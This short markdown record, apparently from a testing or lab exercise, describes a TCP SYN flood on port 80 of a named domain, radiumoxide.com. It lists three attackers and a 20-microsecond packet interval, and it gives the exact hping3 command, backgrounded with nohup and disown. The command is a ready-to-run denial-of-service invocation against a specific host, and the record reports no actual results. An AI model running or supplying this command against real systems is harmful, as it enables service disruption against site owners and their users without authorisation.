# Attack Results

## Description

- Type: TCP SYN Flood
- Number of attackers: 3
- Target port: 80
- Microseconds between packets: 20
- Target: radiumoxide.com
- Attack tool: hping3
- Attack Command: `sudo nohup hping3 -q -i u20 -S -p 80 -c 100000 radiumoxide.com > /dev/null & disown`

